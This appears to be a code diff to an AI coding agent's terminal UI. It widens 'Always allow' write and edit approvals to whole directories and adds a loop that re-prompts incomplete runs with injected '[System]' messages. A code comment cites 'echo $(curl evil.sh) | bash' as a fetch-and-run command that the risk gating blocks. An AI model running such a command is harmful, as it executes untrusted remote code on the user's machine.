@@ -33,6 +33,7 @@ import { handleAgentsCommand, formatEnhancedAgentList } from '../commands/agents
 import { handleInitCommand } from '../commands/init-commands.js';
 import type { CommandOutput } from '../commands/types.js';
 import { createHistoryManager, type HistoryManager } from '../integrations/history.js';
+import type { AgentResult } from '../types.js';
 
 // =============================================================================
 // PATTERN GENERATION FOR ALWAYS-ALLOW
@@ -63,6 +64,12 @@ function generateApprovalPattern(request: TypesApprovalRequest): string {
 
   if (['write_file', 'edit_file', 'read_file'].includes(tool)) {
     const path = (args.path || args.file_path || '') as string;
+    // For write/edit: use directory-level patterns so "Always" covers the whole subtree
+    // e.g. write_file:src/api/ instead of write_file:src/api/routes.ts
+    if ((tool === 'write_file' || tool === 'edit_file') && path.includes('/')) {
+      const dir = path.substring(0, path.lastIndexOf('/') + 1);
+      return `${tool}:${dir}`;
+    }
     return `${tool}:${path}`;
   }
 
@@ -104,6 +111,76 @@ interface TUIMessage {
   role: string;
   content: string;
   ts: Date;
+}
+
+function buildAutoLoopPrompt(
+  details: string | undefined,
+  promptStyle: 'strict' | 'concise',
+): string {
+  if (promptStyle === 'concise') {
+    return `[System] Continue now and execute required actions immediately. Avoid future-intent phrasing. ${details ? `Context: ${details}` : ''}`.trim();
+  }
+  return [
+    '[System] Previous run ended as incomplete because the response described pending work.',
+    'Continue from current state and execute the remaining action now with tools if needed.',
+    'Do not describe what you will do next. Either perform the action or provide a final completion statement.',
+    details ? `Context: ${details}` : '',
+  ].filter(Boolean).join('\n');
+}
+
+export interface AutoLoopAgent {
+  run: (task: string) => Promise<AgentResult>;
+  getResilienceConfig?: () => unknown;
+}
+
+export async function runWithIncompleteAutoLoop(
+  agent: AutoLoopAgent,
+  task: string,
+  callbacks?: { onRetry?: (attempt: number, maxAttempts: number) => void },
+): Promise<{ result: AgentResult; autoLoopRuns: number; reasonChain: string[]; maxIncompleteAutoLoops: number }> {
+  const resilienceCfgRaw = agent.getResilienceConfig?.();
+  const resilienceCfg = resilienceCfgRaw && typeof resilienceCfgRaw === 'object'
+    ? resilienceCfgRaw as {
+      incompleteActionAutoLoop?: boolean;
+      maxIncompleteAutoLoops?: number;
+      autoLoopPromptStyle?: 'strict' | 'concise';
+    }
+    : {};
+  const incompleteAutoLoop = resilienceCfg.incompleteActionAutoLoop ?? true;
+  const maxIncompleteAutoLoops = resilienceCfg.maxIncompleteAutoLoops ?? 2;
+  const promptStyle = resilienceCfg.autoLoopPromptStyle ?? 'strict';
+
+  let result = await agent.run(task);
+  const reasonChain: string[] = [result.completion.reason];
+  let autoLoopRuns = 0;
+
+  while (
+    !result.success
+    && incompleteAutoLoop
+    && (result.completion.reason === 'future_intent' || result.completion.reason === 'incomplete_action')
+    && autoLoopRuns < maxIncompleteAutoLoops
+  ) {
+    autoLoopRuns++;
+    callbacks?.onRetry?.(autoLoopRuns, maxIncompleteAutoLoops);
+    const recoveryPrompt = buildAutoLoopPrompt(result.completion.details, promptStyle);
+    result = await agent.run(recoveryPrompt);
+    reasonChain.push(result.completion.reason);
+  }
+
+  result = {
+    ...result,
+    completion: {
+      ...result.completion,
+      recovery: {
+        intraRunRetries: result.completion.recovery?.intraRunRetries ?? 0,
+        autoLoopRuns,
+        terminal: !result.success,
+        reasonChain,
+      },
+    },
+  };
+
+  return { result, autoLoopRuns, reasonChain, maxIncompleteAutoLoops };
 }
 
 // ToolCallDisplayItem is imported from ./components/ToolCallItem.js
@@ -561,10 +638,12 @@ export function TUIApp({
   const debugBuffer = useDebugBuffer(100);
 
   // Execution mode to prevent duplicate event handling
-  // 'idle' = no active execution, 'processing' = handleSubmit running, 'approving' = /approve running
-  type ExecutionMode = 'idle' | 'processing' | 'approving';
+  // 'idle' = no active execution, 'processing' = handleSubmit running,
+  // 'approving' = /approve running, 'draining' = brief post-run event drain
+  type ExecutionMode = 'idle' | 'processing' | 'approving' | 'draining';
   const [executionMode, setExecutionMode] = useState<ExecutionMode>('idle');
   const executionModeRef = useRef<ExecutionMode>('idle');
+  const executionDrainTimerRef = useRef<NodeJS.Timeout | null>(null);
 
   // Display toggles
   const [toolCallsExpanded, setToolCallsExpanded] = useState(false);
@@ -613,6 +692,20 @@ export function TUIApp({
   messagesLengthRef.current = messages.length;
   pendingApprovalRef.current = pendingApproval;
 
+  const finishExecutionMode = useCallback(() => {
+    if (executionDrainTimerRef.current) {
+      clearTimeout(executionDrainTimerRef.current);
+      executionDrainTimerRef.current = null;
+    }
+    executionModeRef.current = 'draining';
+    setExecutionMode('draining');
+    executionDrainTimerRef.current = setTimeout(() => {
+      executionModeRef.current = 'idle';
+      setExecutionMode('idle');
+      executionDrainTimerRef.current = null;
+    }, 400);
+  }, []);
+
   // Derive theme and colors
   const selectedTheme = getTheme(currentThemeName);
   const colors = selectedTheme.colors;
@@ -650,7 +743,12 @@ export function TUIApp({
     const pattern = generateApprovalPattern(request);
     // Only auto-approve low/moderate risk — high/critical always show dialog
     // This prevents e.g. approving "bash:echo" from auto-approving "echo $(curl evil.sh) | bash"
-    if (alwaysAllowed.has(pattern) && (request.risk === 'low' || request.risk === 'moderate')) {
+    const isAllowed = (request.risk === 'low' || request.risk === 'moderate') && (
+      alwaysAllowed.has(pattern) ||
+      // Prefix match: if we allowed write_file:src/api/, also allow write_file:src/api/sub/file.ts
+      [...alwaysAllowed].some(p => pattern.startsWith(p) && p.endsWith('/'))
+    );
+    if (isAllowed) {
       // Auto-approve without showing dialog
       approvalBridge?.resolve({ approved: true });
       return;
@@ -926,6 +1024,23 @@ export function TUIApp({
       addMessage('error', `${prefix} ${errorMsg}`);
       return;
     }
+    if (event.type === 'completion.blocked') {
+      const e = event as {
+        reasons: string[];
+        openTasks?: { pending: number; inProgress: number; blocked: number };
+        diagnostics?: { forceTextOnly?: boolean; availableTasks?: number; pendingWithOwner?: number };
+      };
+      const details = e.reasons?.length ? e.reasons.join('\n') : 'Completion blocked by unresolved work.';
+      const openTasksLine = e.openTasks
+        ? `Open tasks: ${e.openTasks.pending} pending, ${e.openTasks.inProgress} in_progress, ${e.openTasks.blocked} blocked`
+        : '';
+      const constrainedLine = e.diagnostics?.forceTextOnly
+        ? 'Task continuation is currently suppressed by budget/wrapup force-text mode.'
+        : '';
+      addMessage('system', `[INCOMPLETE]\n${details}${openTasksLine ? `\n${openTasksLine}` : ''}${constrainedLine ? `\n${constrainedLine}` : ''}`);
+      setStatus(s => ({ ...s, mode: 'incomplete' }));
+      return;
+    }
 
     // Insight events - also track tokens for active agents
     if (event.type === 'insight.tokens') {
@@ -1176,14 +1291,20 @@ export function TUIApp({
       case 'stats': {
         const metrics = agent.getMetrics();
         const agentState = agent.getState();
-        addMessage('system', [
+        const lines = [
           `Session Status:`,
           `  Status: ${agentState.status} | Iteration: ${agentState.iteration}`,
           `  Messages: ${agentState.messages.length}`,
           `  Tokens: ${metrics.totalTokens.toLocaleString()} (${metrics.inputTokens} in / ${metrics.outputTokens} out)`,
           `  LLM Calls: ${metrics.llmCalls} | Tool Calls: ${metrics.toolCalls}`,
           `  Cost: $${metrics.estimatedCost.toFixed(4)}`,
-        ].join('\n'));
+        ];
+        const shared = agent.getSharedStats();
+        if (shared) {
+          lines.push(`  Shared Context: ${shared.context.failures} failures, ${shared.context.references} refs`);
+          lines.push(`  Shared Economics: ${shared.economics.fingerprints} fingerprints, ${shared.economics.globalLoops.length} doom loops`);
+        }
+        addMessage('system', lines.join('\n'));
         return;
       }
 
@@ -1669,8 +1790,7 @@ export function TUIApp({
         } catch (e) {
           addMessage('error', `Plan execution failed: ${(e as Error).message}`);
         } finally {
-          executionModeRef.current = 'idle';
-          setExecutionMode('idle');
+          finishExecutionMode();
           setIsProcessing(false);
           setToolCalls([]);
           if (agent.getMode() === 'plan') {
@@ -2066,16 +2186,31 @@ export function TUIApp({
     agent.resetResourceTimer();
 
     try {
-      const result = await agent.run(trimmed);
+      const autoLoop = await runWithIncompleteAutoLoop(agent, trimmed, {
+        onRetry: (attempt, maxAttempts) => {
+          setStatus(s => ({ ...s, mode: `recovering ${attempt}/${maxAttempts}` }));
+          addMessage('system', `[AUTO-LOOP] Retrying incomplete run (${attempt}/${maxAttempts})`);
+        },
+      });
+      const result = autoLoop.result;
       const metrics = agent.getMetrics();
       const modeInfo = agent.getModeInfo();
-      setStatus({ iter: metrics.llmCalls, tokens: metrics.totalTokens, cost: metrics.estimatedCost, mode: modeInfo.name === 'Plan' ? 'ready (plan)' : 'ready' });
+      const completion = result.completion;
+      const finalMode = completion.success
+        ? (modeInfo.name === 'Plan' ? 'ready (plan)' : 'ready')
+        : (completion.reason === 'open_tasks' || completion.reason === 'future_intent' || completion.reason === 'incomplete_action'
+            ? 'incomplete'
+            : 'failed');
+      setStatus({ iter: metrics.llmCalls, tokens: metrics.totalTokens, cost: metrics.estimatedCost, mode: finalMode });
 
       // Calculate current context size (what's actually in the window now)
       const agentState = agent.getState();
       const estimateTokens = (str: string) => Math.ceil(str.length / 3.2);
-      const currentContextTokens = agentState.messages.reduce((sum: number, m: any) =>
+      const messageTokens = agentState.messages.reduce((sum: number, m: any) =>
         sum + estimateTokens(typeof m.content === 'string' ? m.content : JSON.stringify(m.content)), 0);
+      // Include system prompt overhead (codebase context, tools, rules)
+      const systemPromptTokens = agent.getSystemPromptTokenEstimate?.() ?? 0;
+      const currentContextTokens = messageTokens + systemPromptTokens;
       const contextLimit = agent.getMaxContextTokens();
       const contextPct = Math.round((currentContextTokens / contextLimit) * 100);
 
@@ -2095,7 +2230,18 @@ export function TUIApp({
           addMessage('system', fullPlan);
         }
       } else {
-        addMessage('assistant', (result.response || result.error || 'No response') + metricsLine);
+        const responseText = (result.response != null && result.response.length > 0)
+          ? result.response
+          : (result.error || 'No response');
+        if (!result.success) {
+          if (result.completion.reason === 'open_tasks' && result.completion.openTasks) {
+            addMessage('system', `[INCOMPLETE] Open tasks remain: ${result.completion.openTasks.pending} pending, ${result.completion.openTasks.inProgress} in_progress, ${result.completion.openTasks.blocked} blocked`);
+          } else if (result.completion.reason === 'future_intent' || result.completion.reason === 'incomplete_action') {
+            addMessage('system', `[INCOMPLETE] ${result.completion.details || 'Run ended with pending work.'}`);
+          }
+          addMessage('error', `[RUN FAILED] ${result.error || 'The agent did not complete this task successfully.'}`);
+        }
+        addMessage('assistant', responseText + metricsLine);
       }
 
       const checkpoint = agent.autoCheckpoint(true);
@@ -2119,12 +2265,11 @@ export function TUIApp({
     } catch (e) {
       addMessage('error', (e as Error).message);
     } finally {
-      executionModeRef.current = 'idle';
-      setExecutionMode('idle');
+      finishExecutionMode();
       setIsProcessing(false);
       setToolCalls([]);
     }
-  }, [addMessage, handleCommand, agent, sessionStore, saveCheckpointToStore, persistenceDebug, persistPendingPlanToStore]);
+  }, [addMessage, handleCommand, agent, sessionStore, saveCheckpointToStore, persistenceDebug, persistPendingPlanToStore, finishExecutionMode]);
 
   // =========================================================================
   // COMMAND PALETTE ITEMS
@@ -2359,13 +2504,14 @@ export function TUIApp({
     setSwarmExpanded(prev => !prev);
   }, []);
 
-  // Update context tokens
+  // Update context tokens (include system prompt overhead)
   useEffect(() => {
     const agentState = agent.getState();
     const estimateTokens = (str: string) => Math.ceil(str.length / 3.2);
-    const tokens = agentState.messages.reduce((sum: number, m: any) =>
+    const messageTokens = agentState.messages.reduce((sum: number, m: any) =>
       sum + estimateTokens(typeof m.content === 'string' ? m.content : JSON.stringify(m.content)), 0);
-    setContextTokens(tokens);
+    const systemPromptTokens = agent.getSystemPromptTokenEstimate?.() ?? 0;
+    setContextTokens(messageTokens + systemPromptTokens);
   }, [status.tokens, messages.length, agent]);
 
   // Track elapsed time
